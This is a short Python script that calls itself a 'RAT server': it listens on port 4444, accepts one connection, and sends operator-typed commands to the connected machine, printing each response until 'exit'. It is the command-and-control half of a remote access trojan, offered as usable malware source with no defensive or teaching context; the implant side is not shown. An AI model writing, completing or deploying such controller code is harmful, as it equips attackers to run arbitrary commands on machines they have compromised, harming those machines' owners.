
import socket

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"RAT server listening on {host}:{port}...")
    
    client_socket, client_address = server.accept()
    print(f"Connection from {client_address}")
    
    while True:
        command = input("Enter command to execute: ").strip()
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break
        client_socket.send(command.encode())
        response = client_socket.recv(4096).decode()
        print(f"Response: {response}")
    
    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
    